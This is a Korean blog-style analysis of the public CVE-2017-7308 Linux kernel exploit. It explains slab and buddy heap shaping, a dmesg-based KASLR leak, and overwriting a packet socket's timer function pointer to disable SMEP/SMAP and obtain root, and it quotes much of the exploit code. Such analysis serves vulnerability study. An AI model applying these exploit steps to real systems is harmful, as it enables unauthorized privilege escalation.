함수 포인터 xmit, function 모두 1개의 파라미터를 가지는 함수 호출을 덮어쓸 수 있다.


xmit는 packet socket을 통해 패킷을 보낼 때마다 호출되는 함수포인터로써 commit_creds(prepare_kernel_cred(0))를 호출시켜 root 권한을 획득하는데 사용된다. 

앞의 예제코드 snd.c에서 tpacket_req3 구조체에 block과 frame 관련 정보를 설정할 때에, tp_retire_blk_tov도 같이 설정했었다. ring buffer에서 packet이 저장되는 block은 가득 찰 경우 외에도 일정 시간이 지나면(사용자는 수신된 패킷을 가급적 빨리 보고싶어 하므로) close되고 사용자에게 release된다고 설명했었는데, 이 때 설정되는 일정한 시간이 바로 tp_retire_blk_tov 필드이다. 이 일정한 시간이 지나면 정해진 일련의 작업들을 진행하게 되는데, 이 때 호출되는 함수가 function 함수 포인터를 참조해서 호출되게 된다. 따라서 이 함수 포인터를 덮어쓸 경우 사용자가 지정한 시간 이후에 이 함수 포인터가 참조하는 임의의 함수를 호출할 수 있게 되는데, 원문 저자는 이를 SMEP/SMAP를 bypass 하는데 사용한다.

이렇게 ring buffer의 block을 overflow 시켜 packet_socket을 덮어쓰기 위해서는 packet_socket 구조체가 block이 할당된 메모리의 인접한 곳에 위치하도록 힙을 조정해야만 한다. kernel에서 ring buffer의 block은 kernel page allocator인 `buddy allocator`를 통해 관리되고, packet_socket은 kmalloc() 호출 시 할당되며, 이는 `slub allocator`에 의해서 관리된다. 이들의 특징을 통해 block과 packet_socket을 연속된 메모리 주소 상에 위치시킬 수 있다.



#### A. buddy allocator

`buddy allocator`에 대한 자세한 설명은 [[Linux Kernel] Buddy Memory Allocator 란?](https://wogh8732.tistory.com/402) 를 참고하도록 하자. 여기서는 핵심적인 내용만 다룰 것이다.

아래와 같이 linux는 메모리를 page로 관리하며 기본 단위는 4096 byte(4k)이다. (더 정확한 설명은 위의 문서를 참고하고 여기서는 대충 이렇게 알고 있자) . buddy allocator는 order number별로 페이지 크기를 관리하는데, order 0은 4k(4k 1개), order 1은 8k(4k 2개), order 2는 16k(4k 4개) 단위로 연결되어 있다.

<img src="/assets/images/cve-2017-7308/buddy1.png" alt="buddy allocator" style="zoom: 50%;" />


<br>
위의 그림을 예로 설명하면, order 0중에서 free인 4k 메모리들이 list로 연결되어 있고, order 1인 free 메모리는 1개(8k, 4k page 2개 단위)가 list head로부터 연결되어 있으며, order 2인 free 메모리 역시 1개(16k, 4k page 4개)가 list head로부터 연결되어 있다. 이 상태에서 메모리 할당 요청이 오게 되면 적절한 크기의 free memory가 반환되게 된다. 아래 그림을 보고 할당 과정을 조금 더 상세히 보자.

<img src="/assets/images/cve-2017-7308/buddy2.png" alt="buddy allocator2"  />


<br>
위의 그림처럼 메모리가 있는 상황에서 8k 메모리를 요청하게 되면, order-1의 free list를 확인한다. 현재 order-1의 free list에는 사용 가능한 페이지가 없으므로 상위 구역(?)인 order-2를 확인한다. order-2의 free list에는 1개(16k, 4k 4개)가 있으므로 이 메모리를 2개(8k, 8k)로 분할한 후 page 6,7을 할당한다.  남은 메모리 page 8,9는 하위 order-1으로 재배치 되어 아래 그림과 같게 된다.

<img src="/assets/images/cve-2017-7308/buddy3.png" alt="buddy allocator3"  />


#### B. slub allocator

slub allocator에 대한 자세한 설명은 [[Linux Kernel] Slab Memory Allocator 란?](https://wogh8732.tistory.com/418) 를 참고하도록 하자.
<br>여기에서는 핵심적인 내용만 다룰 것이다.

buddy allocator의 기본 단위인 4096 byte 보다 작은 단위의 메모리 파편화를 줄이기 위해 slub allocator를 사용한다.
<br>아래의 그림을 보자.

<a href="/assets/images/cve-2017-7308/slab.png"><img src="/assets/images/cve-2017-7308/slab.png" alt="slab"></a>



그림에서 볼 수 있듯이, buddy allocator가 관리하는 page는 slab allocator에 의해서 조금 더 작은 단위의 slab object들로 구성되어 있다. slab object들로 구성된 단위를 slab page라고 하며, slab page가 1개 이상 모여 구성된 것을 아래아 같이 slab cache라고 한다.
<a href="/assets/images/cve-2017-7308/slab_cache.png"><img src="/assets/images/cve-2017-7308/slab_cache.png" alt="slab_cache" style="zoom:80%;"></a>


<br>
slab cache는 자주 사용되는 메모리 크기에 대응하여 미리 할당되어 있으며, /proc/slabinfo 파일을 읽어보면 아래와 같이 어떤 slab cache가 할당되어 있는지 확인할 수 있다.
<a href="/assets/images/cve-2017-7308/slabinfo.png"><img src="/assets/images/cve-2017-7308/slabinfo.png" alt="slabinfo"></a>

<a href="/assets/images/cve-2017-7308/slab_kmalloc.png"><img src="/assets/images/cve-2017-7308/slab_kmalloc.png" alt="slab_kmalloc"></a>



<br>
slab cache는 kmem_cache 구조체 형태로 관리되며, 크게 kmem_cache_cpu_percpu형 구조체인 cpu_slab과 kmem_cache_node형 구조체인 node로 구분되며, 각 노드별, 각 cpu별로 관리된다. 아래 그림은 slab cache의 구조를 나타낸 그림이다.
<a href="/assets/images/cve-2017-7308/slab_cache_info.png"><img src="/assets/images/cve-2017-7308/slab_cache_info.png" alt="slab_cache_info"></a>


<br>
위 그림에서의 slab page 내 slab object들은 아래 그림처럼 free slab object들끼리 연결된 채로 구성되어 있으며, 메모리 할당 요청 시 적절한 free slab object가 할당된다.
<a href="/assets/images/cve-2017-7308/slab_page.png"><img src="/assets/images/cve-2017-7308/slab_page.png" alt="slab_page"></a>

<br>
slab object들이 할당되는 방식은 fastpath -> slowpath-4까지 존재하는데, 간단히 정리하면 아래와 같다.

1. 메모리 할당 요청 시 slab object 할당 우선 순위는 cpu > node이다.
2. 메모리 할당 요청이 오면 먼저 해당 cpu의 freelist, page->freelist, partial->freelist 순서대로 확인한다.
3. 2가 실패하면 node로부터 cpu의 freelist로 slab page를 이동시킨다.
4. 3이 실패하면 다른 cpu의 node로부터 slab page를 해당 cpu로 이동시킨다.
5. 4까지 실패할 경우, buddy allocator를 통해 새롭게 slab page를 할당받아 해당 cpu에 추가한다.

> 정확한 동작 방식은 이 문서의 범위를 넘어가기 때문에, [[Linux Kernel] Slab Memory Allocator 란?](https://wogh8732.tistory.com/418)를 참고하기 바란다.


#### C. shaping heap

지금까지 확인한 내용들을 정리해 보면 아래와 같다.

1. Packet Socket 수신 시 패킷을 저장하는 과정에서 ring buffer block의 private area 크기에 대한 검사 오류로 overflow 발생
2. packet_socket 구조체의 xmit와 retire_blk_timer의 func라는 function pointer를 덮어씀
3. block과 packet_socket 구조체가 메모리 상에서 인접해 있어야 함
4. buddy allocator와 slab allocator의 동작 방식을 이용하여 메모리를 인접하도록 설정할 수 있음


이제 4번, 어떻게 block과 packet_socket 구조체가 인접하도록 heap을 만들 수 있는지 알아보자.


packet_socket 구조체의 크기는 1920(pahole 명령어로 확인 가능)으로 해당 구조체는 slab allocator에 의해 kmalloc-2048 크기의 cash가 할당된다. slab cash는 2^n 크기의 객체를 위한 메모리를 미리 생성해 놓고 있으며 1024 < 1920 < 2048이므로 kmalloc-2048 cash를 사용하게 된다. 그리고 ubuntu에서 kmalloc-2048은 0x8000(8k) 크기의 slab page를 사용한다. 따라서 아래와 같은 순서로 메모리를 원하는대로 정렬할 수 있다.

1. 현재 할당된 slab page를 꽉 채우기 위해 많은 수의 packet socket을 할당한다. 이 때 kmalloc-2048 cash의 freelist가 계속 소진되다가 어느 순간 모든 freelist가 소진되어 새로운 slab page(0x8000, 8k)를 할당받을 것이다. 새로 할당받은 8k 크기의 slab page는 아직 메모리 할당/해제를 하지 않았으므로 slab page내 free slab object들은 모두 메모리의 연속된 공간에 위치하고 있으며, freelist 역시 메모리의 연속된 공간에 위차한 slab object들이 연결되어 있다.
2. 많은 수의 0x8000 byte 크기의 블록들을 할당해서 page freelist를 모두 소진하여 상위 크기의 page가 분할되도록 한다. 이를 위해 packet socket을 생성한 후 0x8000 byte의 block을 가지는 ring buffer를 연결하는 작업을 반복한다. 상위 page에서 분할된 page 역시 메모리 할당/해제를 하지 않았으므로 해당 페이지에서 할당되는 모든 block들은 모두 메모리의 연속된 공간에 위치하게 된다.
3. 조작된 private area 크기가 설정된 0x8000 byte 크기의 block 2개를 연결한 packet socket을 생성한다. 2에 의해 지금 생성되는 2개의 block은 모두 메모리의 연속된 공간에 위치하게 된다.
4. 새로운 slab page를 할당받도록 충분한 양의 packet socket을 다시 생성한다. 새로 할당받게 되는 slab page는 0x8000 크기의 page이므로, 2에 의해 3에서 할당된 block과 연속된 메모리 주소를 가지게 되어,  packet_sock 구조체를 block과 인접하게 위치시킬 수 있게 된다. packet_sock 생성 시 크기는 0x1000정도의 적당한(0x8000보다 작은) 크기를 사용한다.

> 복잡하게 보이지만 packet_socket이 8k page를 사용하므로, block 할당을 이용하여 8k page를 소진하는 것이 목표이다. 상위 page 분할을 일으킨 후 8k block과 packet_socket을 차례로 할당하면 연속된 메모리 주소를 가지게 되는 것이다. 따라서 1번 과정을 생략하고 4번에서 충분한 양의 packet_socket 구조체를 할당해도 된다.



3에서 block을 2개 할당하는 이유는 실제로 overflow가 일어나는 block이 2번째 block이기 때문이다. 2개의 block이 할당된 packet socket이 packet을 수신하게 되면, kernel이 해당 packet을 저장하기 위한 block을 찾는 과정을 시작하는데, 먼저 1번째 block의 크기를 검사한다. 하지만 1번째 block의 private area는 조작되어 있으므로 계산된 block의 크기가 1번째 block의 끝을 넘기 때문에 kernel은 1번째 block에는 수신된 packet을 저장할 만한 충분한 공간이 존재하지 않다고 판단하여 다음 block(2번째 block)을 반환하게 되고, 수신된 packet은 2번째 block에 저장되게 된다.

이 동작과 관련된 소스는 __packet_lookup_frame_in_block() 함수의 1080 ~ 1094 라인에서 찾을 수 있다.
(https://elixir.bootlin.com/linux/v4.8/source/net/packet/af_packet.c#L1041)
<a href="/assets/images/cve-2017-7308/packet_lookup_frame_in_block.png"><img src="/assets/images/cve-2017-7308/packet_lookup_frame_in_block.png" alt="packet_lookup_frame_in_block"></a>
1080라인에서 1번째 block의 크기를 계산한 결과가 1번째 block의 끝을 넘어서게되면 1086라인에서 1번째 block을 close 한 다음 1089라인에서 2번째 block을 가져온 다음 크기 검증 없이 바로 반환하게 된다.


아래는 shaping된 heap에서 overflow가 발생했을 때의 모습을 그림으로 표현한 것이다.

<a href="/assets/images/cve-2017-7308/overwrite.png"><img src="/assets/images/cve-2017-7308/overwrite.png" alt="overwrite"></a>


###  4. struct timer_list retire_blk_timer

packet socket은 수신된 패킷을 ring buffer에 저장하며, ring buffer가 가득찰 경우 kernel에 의해서 retired가 된다. 일반적으로 사용자는 수신된 packet을 빨리 보기를 원하기 때문에, kernel은 ring buffer가 가득차지 않더라도 timer를 이용해 ring buffer를 retire할 수 있다. 즉, timer에 의해서 kernel이 packet을 retire 하기 위한 일련의 동작을 진행할 때 실행되는 함수가 바로 timer_list->function이 가리키는 함수이다. 또한 이 함수는 실행될 때 data를 parameter로 참조한다.

정리하면 timer가 초과할 때마다 retire_blk_timer->function(retire_blk_timer->data) 함수가 실행되며, 우리는 function과 data 필드를 같이 덮어쓸 수 있으므로, parameter가 1개인 임의의 함수를 호출할 수 있게 된다.

timer 값은 ring buffer를 packet socket에 연결할 때 사용자가 설정할 수 있으며, timer_list 구조체는 아래와 같다.
(https://elixir.bootlin.com/linux/v4.8/source/include/linux/timer.h#L12)

```c
struct timer_list {
	/*
	 * All fields that change during normal runtime grouped to the
	 * same cacheline
	 */
	struct hlist_node	entry;
	unsigned long		expires;
	void			(*function)(unsigned long);
	unsigned long		data;
	u32			flags;

#ifdef CONFIG_TIMER_STATS
	int			start_pid;
	void			*start_site;
	char			start_comm[16];
#endif
#ifdef CONFIG_LOCKDEP
	struct lockdep_map	lockdep_map;
#endif
};
```

<br><br>
## Exploit 분석

전체 exploit 코드는 아래에서 다운로드 할 수 있다.

`https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-7308/poc.c`


### 1. setup_sandbox() 함수

main() 함수의 시작은 setup_sandbox() 함수로 시작하며 해당 코드는 아래와 같다.
<a href="/assets/images/cve-2017-7308/setup_sandbox.png"><img src="/assets/images/cve-2017-7308/setup_sandbox.png" alt="setup_sandbox"></a><br>
이 함수는 이름 그대로 linux kernel의 container 기술을 이용해서 대상 서버로부터 별도의 독립된 공간, 즉 sandbox를 만드는 것이 목적이다. 우리가 분석하려고 하는 CVE-2017-7308 취약점은 AF_PACKET 방식의 socket을 처리할 때 발생하는데, 이 socket을 만들기 위해서는  CAP_NET_RAW 권한이 필요하다.

따라서 공격자가 해당 권한을 가지기 위해 linux kernel에서 지원하는 namespace와 cgroup 기능을 이용해서 별도의 container를 만든 후, 현재 사용자에게 해당 container의 관리자 권한을 부여하는 것이다.

> linux container 기술에 대한 자세한 사항은 아래를 참고하도록 한다.

> [Docker(container)의 작동 원리: namespaces and cgroups]: https://tech.ssut.me/what-even-is-a-container/



코드를 좀 더 자세히 분석해 보자. 먼저 아래와 같이 현재 사용자의 uid, gid를 구해온다.

```c
int real_uid = getuid();
int real_gid = getgid();
```

<br>
아래 코드에서 unshare()는 linux namespace를 쉽게 다룰 수 있도록 제공하는 함수이다. CLONE_NEWUSER 라는 변수를 넘겨줄 경우 새로운  user namespace를 만든다. 즉 이 함수가 실행된 순간부터 uid와 gid가 격리되는 것이다.<br>
이후 CLONE_NEWNET 변수를 이용하여 사용자의 네트워크(nic, address, route, fw 등)를 격리시킨다.

```c
if (unshare(CLONE_NEWUSER) != 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    exit(EXIT_FAILURE);
}

if (unshare(CLONE_NEWNET) != 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    exit(EXIT_FAILURE);
}
```

<br>
앞에서 구한 사용자의 uid, gid를 이용하여 격리된 sandbox의 관리자로 변경한다. 이제 sandbox에서 id를 입력하면 uid, gid 모두 0으로 표시되게 된다.

```c
if (!write_file("/proc/self/setgroups", "deny")) {
    perror("[-] write_file(/proc/self/set_groups)");
    exit(EXIT_FAILURE);
}
if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
    perror("[-] write_file(/proc/self/uid_map)");
    exit(EXIT_FAILURE);
}
if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
    perror("[-] write_file(/proc/self/gid_map)");
    exit(EXIT_FAILURE);
}
```

<br>
최근의 컴퓨터들은 여러개의 cpu를 가지고 있기 때문에 exploit이 현재 cpu에서 실행되다가 다른 cpu에서 실행이 될 수도 있다. 이건 현대 cpu들의 Mitigation을 우회하는 것에 문제가 생길 수도 있는데 자세한 것은 뒤에서 설명하기로 한다. 어쨌든 아래의 코드는 이 exploit이 현재 cpu에서만 실행되도록 보장하기 위한 코드이다.

```c
cpu_set_t my_set;
CPU_ZERO(&my_set);
CPU_SET(0, &my_set);
if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
    perror("[-] sched_setaffinity()");
    exit(EXIT_FAILURE);
}
```

<br>
마지막으로 취약점을 trigger 하기 위해 loopback 인터페이스를 활성화 시킨다.

```c
if (system("/sbin/ifconfig lo up") != 0) {
    perror("[-] system(/sbin/ifconfig lo up)");
    exit(EXIT_FAILURE);
}
```

### 2. get_kernel_addr()

다음으로 실행되는 함수는 get_kernel_addr() 이다. 이 함수는 linux kernel에 적용되어 있는 Mitigation인 KASLR을 bypass하기 위해 필요한 정보를 수집하는 기능을 한다. KASLR이 적용된 kernel은 부팅 시마다 메모리의 위치가 달라지기 때문에 kernel exploit 난이도가 상승할 수 밖에 없다.

linux의 경우 kernel 버전 별로 KALSR을 bypass 하는 방법이 조금씩 다르다. 대상인 4.8.x kernel의 경우, 부팅 시에 kernel의 주소를 syslog 파일에 기록하는 취약점을 가지고 있다. 따라서 이 주소를 이용하여 kernel base address를 쉽게 구할 수 있다.

전체 코드는 아래와 같다.<br>
<a href="/assets/images/cve-2017-7308/get_kernel_addr.png"><img src="/assets/images/cve-2017-7308/get_kernel_addr.png" alt="get_kernel_addr"></a>

<br>
코드를 조금 더 자세히 살펴보자.<br>
아래는 kernel 로그 파일을 읽는 함수인 klogctl() 함수를 이용해서 syslog 파일을 읽어 버퍼에 저장하는 코드이다.

```c
int size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
if (size == -1) {
perror("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)");
exit(EXIT_FAILURE);
}

size = (size / getpagesize() + 1) * getpagesize();
char *buffer = (char *)mmap(NULL, size, PROT_READ|PROT_WRITE,
MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

size = klogctl(SYSLOG_ACTION_READ_ALL, &buffer[0], size);
if (size == -1) {
perror("[-] klogctl(SYSLOG_ACTION_READ_ALL)");
exit(EXIT_FAILURE);
}
```
<br>
그리고 버퍼에서 **Freeing SMP** 문자열이 존재하는 라인을 찾은 다음 해당 라인에서 ffff 로 시작하는 16개의 문자를 unsigned long형 정수로 변경한다.

```c
const char *needle1 = "Freeing SMP";
char *substr = (char *)memmem(&buffer[0], size, needle1, strlen(needle1));
if (substr == NULL) {
    fprintf(stderr, "[-] substring '%s' not found in dmesg\n", needle1);
    exit(EXIT_FAILURE);
}

for (size = 0; substr[size] != '\n'; size++);

const char *needle2 = "ffff";
substr = (char *)memmem(&substr[0], size, needle2, strlen(needle2));
if (substr == NULL) {
    fprintf(stderr, "[-] substring '%s' not found in dmesg\n", needle2);
    exit(EXIT_FAILURE);
}

char *endptr = &substr[16];
unsigned long r = strtoul(&substr[0], &endptr, 16);
```

> 위의 작업은 터미널에서도 아래와 같이 쉽게 확인 가능하다.
>
> ```bash
> dmesg |grep "Freeing SMP"
> ```
>
> ```bash
> [    0.155019] Freeing SMP alternatives memory: 32K (ffffffff820ee000 - ffffffff820f6000)
> ```


<br>
마지막으로 찾아낸 주소에 아래와 같은 연산을 거친 후 반환하는데, 이 때 반환되는 값은 kernel의 .text 영역이 시작하는 주소이다.

```c
r &= 0xfffffffffff00000ul;
r -= 0x1000000ul;

return r;
```

<br>
위의 계산식이 어떻게 나왔는지 알기 위해 꽤 많은 시간을 투자했으나 내린 결론은 저자가 특별한 의미 없이 아래와 같이 그냥 산술적으로 계산했던 것으로 보인다.<br>
아래는 원문에 나와 있는 내용이다.

> \# Boot #1
>
> $ dmesg | grep 'Freeing SMP'
>
> [   0.012520] Freeing SMP alternatives memory: 32K (ffffffffa58ee000 - ffffffffa58f6000)
>
> $ sudo cat /proc/kallsyms | grep 'T _text'
>
> ffffffffa4800000 T _text
>
> \# Boot #2
>
> $ dmesg | grep 'Freeing SMP'
>
> [   0.017487] Freeing SMP alternatives memory: 32K (ffffffff85aee000 - ffffffff85af6000)
>
> $ sudo cat /proc/kallsyms | grep 'T _text'
>
> ffffffff84a00000 T _text



처음 부팅 시 **Freeing SMP** 문자열을 검색해서 획득한 주소는 ffffffffa58ee000 이고, text  영역의 주소는 ffffffffa4800000 이다. 두 번째 부팅 시에 획득한 주소는 각각 ffffffff85aee000, ffffffff84a00000 이다.<br>
아래 표에서 볼 수 있듯이 부팅 전후에도 해당 주소들의 처음 9자리는 변하지 않는다. 그리고 10번째 자리는 항상 1이 감소된다.

|                     Kernel base address                      |                     kernel text address                      |
| :----------------------------------------------------------: | :----------------------------------------------------------: |
| <span style="color:red">ffffffffa</span><span style="color:blue">5</span>8ee000 | <span style="color:red">ffffffffa</span><span style="color:blue">4</span>800000 |
| <span style="color:blue">ffffffff8</span><span style="color:red">5</span>aee000 | <span style="color:blue">ffffffff8</span><span style="color:red">4</span>a00000 |

따라서 저자의 소스코드와 같이 하위 5자리를 0으로 초기화한 후 0x1000000를 빼주면 kernel text address를 구할 수 있는 것이다.


### 3. Calculator functions address

지금까지 get_kernel_addr() 함수를 통해 kernel의 base address를 얻었다. 이제 root 권한을 획득하기 위해 주로 사용되는 prepare_kernel_cred() 함수와 commit_creds() 함수의 주소를 알아야 할 차례이다(commit_creds(prepare_kernel_cred(0))로 실행한다).

위에서도 잠깐 나왔지만 /proc/kallsyms에는 kernel의 전역 심볼이 기록되어 있다. ubuntu 16.04의 경우 별도의 mitigation이 없기 때문에 일반 사용자도 해당 파일로부터 두 함수의 주소를 얻을 수 있다.

아래는 ubuntu 20.04에서 /proc/kallsyms를 읽은 결과이며, mitigation의 영향으로 올바른 주소가 나오지 않는다.
<a href="/assets/images/cve-2017-7308/2004_kallsyms.png"><img src="/assets/images/cve-2017-7308/2004_kallsyms.png" alt="2004_kallsyms"></a>

<br>
아래는 대상 시스템인 ubuntu 16.04로부터의 결과이며, mitigation이 없기 때문에 두 함수의 주소를 구할 수 있다.
<a href="/assets/images/cve-2017-7308/1604_kallsyms.png"><img src="/assets/images/cve-2017-7308/1604_kallsyms.png" alt="1604_kallsyms"></a>

<br>
구해진 prepare_kernel_cred()와 commit_creds()의 주소는 각각 0xffffffff810a60e0과 0xffffffff810a5cf0이다. kernel base address를 계산할 때 확인한 것처럼 하위 5개자리만 변경이 되므로 각 함수의 오프셋은 아래와 같이 된다.

| Functions Address  | Kernel Base Address | Offset  |
| :----------------: | :-----------------: | :-----: |
| 0xffffffff810a60e0 | 0xffffffff81000000  | 0xa60e0 |
| 0xffffffff810a5cf0 | 0xffffffff81000000  | 0xa5cf0 |



이렇게 구해진 값은 아래와 같이 exploit에 정의된 값과 동일하다.
<a href="/assets/images/cve-2017-7308/offset.png"><img src="/assets/images/cve-2017-7308/offset.png" alt="offset"></a>

<br>
그리고 이전에 구한 kernel base address에 offset을 더하면 운영중인 시스템에 로딩된 prepare_kernel_cred()와 commit_creds()의 주소를 구할 수 있다. 동일한 방법으로 native_write_cr4()의 주소도 구한다.
<a href="/assets/images/cve-2017-7308/offset_src.png"><img src="/assets/images/cve-2017-7308/offset_src.png" alt="offset_src"></a>

kaslr, smep, smap을 bypass 하는 방법은 이후에 다시 다루도록 하고 코드의 다음 부분으로 넘어간다.


### 4. kmalloc_pad()

다음으로 호출되는 함수는 kmalloc_pad()이며 파라미터로 512가 넘어간다. 이 함수는 전달된 512만큼 for loop를 돌면서 packet_sock_kmalloc() 함수를 호출며, packet_sock_kmalloc() 함수는 socket() 함수를 이용해 AF_PACKET 소켓을 생성한다.

```c
#define KMALLOC_PAD			512

int packet_sock_kmalloc() 
{
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("[-] socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	return s;
}

void kmalloc_pad(int count)
{
	int i;
	for (i = 0; i < count; i++)
		packet_sock_kmalloc();
}

kmalloc_pad(KMALLOC_PAD);
```

이 함수의 목적은 kmalloc-2048 내 free slab object를 소진하여 새로운 0x8000 page를 할당받기 위함이다. 운영 중인 ubuntu linux에 따라 free slab object를 소진하기 위해 필요한 숫자는 다르지만, 원문 저자의 경우 512개 생성 시 동작했다고 하니 참고하기 바란다.


### 5. pagealloc_pad()

다음으로 호출되는 함수는 pagealloc_pad()이며 전달되는 파라미터는 1024로, 생성할 block의 갯수를 나타낸다. 이 함수는 packet socket 생성 후, 0x8000 크기의 block 1024개를 packet socket에 연결한다. 그리고 해당 packet socket을 loopback에 bind 한다.

```c
int packet_socket_setup(unsigned int block_size,
						unsigned int frame_size,
						unsigned int block_nr,
						unsigned int sizeof_priv,
						int timeout)
{
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0)
	{
		perror("[-] socket(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv, timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0)
	{
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	return s;
}

void pagealloc_pad(int count)
{
	packet_socket_setup(0x8000, 2048, count, 0, 100);
}

pagealloc_pad(PAGEALLOC_PAD);
```

<br>
이 함수의 목적은 0x8000 크기의 free page를 소진시켜 상위 page로부터 새로운 page를 할당받는 것이다. 역시 사용 중인 ubuntu linux에 따라 다르겠지만 원문 저자는 1024개 생성 시 동작했다고 하니 참고 바란다.

여기까지 오면 이제 overflow를 위한 heap 정렬은 끝나게된다. 이제부터 새로 할당되는 0x8000 page의 경우 연속된 메모리 주소를 가지게 되며, kmalloc-2048 역시 0x8000 page를 2048로 쪼개어 사용하므로, 이전에 할당된 0x8000 page와 연속된 메모리 주소를 가지게 된다.


### 6. oob_timer_execute

다음으로 실행되는 함수는 oob_timer_execute() 이다. 이 함수는 SMEP/SMAP를 우회하기 위해 private area를 조작해 overflow를 일으켜 `retire_blk_timer->function`과 `retire_blk_timer->data`를 **NATIVE_WRITE_CR4** 함수의 주소와 **CR4_DESIRED_VALUE**로 덮어쓴다.

```c
void oob_timer_execute(	void *func,
						unsigned long arg)
{
	oob_setup(2048 + TIMER_OFFSET - 8);

	int i;
	for (i = 0; i < 32; i++)
	{
		int timer = packet_sock_kmalloc();
		packet_sock_timer_schedule(timer, 1000);
	}

	char buffer[2048];
	memset(&buffer[0], 0, sizeof(buffer));

	struct timer_list *timer = (struct timer_list *)&buffer[8];
	timer->function = func;
	timer->data = arg;
	timer->flags = 1;

	oob_write(&buffer[0] + 2, sizeof(*timer) + 8 - 2);

	sleep(1);
}
```

<br>
먼저 oob_setup() 함수부터 살펴보자.

```c
int oob_setup(int offset)
{
	unsigned int maclen = ETH_HDR_LEN;
	unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN + (maclen < 16 ? 16 : maclen));
	unsigned int macoff = netoff - maclen;
	unsigned int sizeof_priv = (1u<<31) + (1u<<30) + 0x8000 - BLK_HDR_LEN - macoff + offset;
	return packet_socket_setup( 0x8000,
								2048,
								2,
								sizeof_priv,
								100);
}

oob_setup(2048 + TIMER_OFFSET - 8);
```

<br>
위의 macoff를 계산하는 과정은 tapcket_rcv() 함수의 소스와 동일하다. 해당 값을 구하는 이유는 실제로 패킷을 복사하는 skb_copy_bits에 전달되는 offset이 `h.raw + macoff`이기 때문이다. 따라서 해당 값을 참고하여 private area 크기를 정한다. h.raw는 현재 block의 frame이 시작하는 위치를 나타낸다. exploit 시 h.raw가 공격할 함수 포인터를 가리키도록 할 것이기 때문에, 이 값에서 macoff를 빼주기 위해 미리 계산을 해 놓는다.



private area를 구하는 계산은 다음과 같다.

```c
sizeof_priv = (1u<<31) + (1u<<30) + 0x8000 - BLK_HDR_LEN - macoff + offset;
```

```assembly
1u << 31
00000000 00000000 00000000 00000001
10000000 00000000 00000000 00000000 => 2147483648(0x80000000) [int형의 범위(–2,147,483,648 ~ 2,147,483,647)를 넘음]

1u << 30
00000000 00000000 00000000 00000001
01000000 00000000 00000000 00000000 => 1073741824(0x40000000)

BLK_HDR_LEN => 48
macoff => 82
offset => 2048 + TIMER_OFFSET - 8 => 2936

2147483648 + 1073741824 + 32768 - 48 - 82 + 2936 = 3221261046(0xc0008af6)
```


계산된 결과값은 0xc0008af6이다. 이 값이 어떻게 계산되었는지 알아보자.

처음 (1u<<31) + (1u<<30)는 private area 영역의 크기를 검사하는 if문을 우회하기 위한 것으로써 해당 구문은 아래처럼 크기를 계산한다.

```c
(int)(req->tp_block_size - BLK_PLUS_PRIV(req_u->req3.tp_sizeof_priv)) <= 0)
    
req->tp_block_size = 4096 = 0x1000
BLK_PLUS_PRIV(req_u->req3.tp_sizeof_priv) = (1 << 31) + (1 << 30) + 48 = 0xc0000030
0x1000 - 0xc0000030 = 0xBFFFF030 = 3221221424
```

<br>
다음 0x8000은 block의 크기만큼 이동해서 block을 완전히 뛰어넘기 위해서 더해지는 값이다.

BLK_HDR_LEN은 아래와 같이 정의되어 있으며 block header의 크기를 나타내는데 이 값을 빼줌으로써 정확하게 1개의 block을 뛰어넘게 되고 해당 offset은 이제 packet socket의 시작 지점을 가리키게 된다.

```c
#define BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))
```

<br>
이후 skb_copy_bits()에 전달되는 offset이 정확하게 timer 구조체를 가리킬 수 있도록 macoff 값을 뺀 다음, 마지막으로 offset 값을 더해주는데, 이 값을 한번 살펴보자. 

oob_setup() 함수에 전달된 파라미터인 offset은 `2048 + TIMER_OFFSET - 8`이다. 실제 packet_sock 구조체로부터 retire_blk_timer 구조체까지의 거리인 TIMER_OFFSET은 896이다(pahole로 각 구조체를 찾아 offset을 더하여 구할 수 있다). 하지만 전달된 offset은 TIMER_OFFSET 외에도 2048을 더하고 8을 뺀 값으로 구성되어 있다.

2048을 더하는 의미는 block과 바로 인접한 여러 개의 packet_socket들 중 두 번째 packet_socket 구조체를 덮어쓰기 위한 값이다. 아래 그림을 보면 조금 더 이해가 쉬울 것이다. private area의 경우 실제 할당된 공간이 있는 것은 아니기 때문에 offset 계산에는 영향을 미치지 않는다.  그리고 8을 빼는 이유는 도저히 알 수가 없었는데, 일단 지금까지 offset을 계산하는 방법을 다시 한번 정리해보자.

tpacket_rcv에서 수신된 패킷의 데이터를 복사하는 skb_copy_bits() 함수에 실제 데이터의 위치를 나타내는 offset이 전달되는데 연관된 값은 아래와 같다.

```c
sizeof_priv = (1u<<31) + (1u<<30) + 0x8000 - BLK_HDR_LEN - macoff + 2048 + TIMER_OFFSET - 8;
pkc1->nxt_offset = pkc1->pkblk_start + BLK_HDR_LEN + pkc1->blk_sizeof_priv;
pkc1->nxt_offset = pkc1->pkblk_start + 48 + (1u<<31) + (1u<<30) + 0x8000 - 48 - macoff + 2048 + 896 - 8;

h.raw = packet_current_rx_frame(po, skb,TP_STATUS_KERNEL, (macoff+snaplen));
h.raw = pkc->nxt_offset;
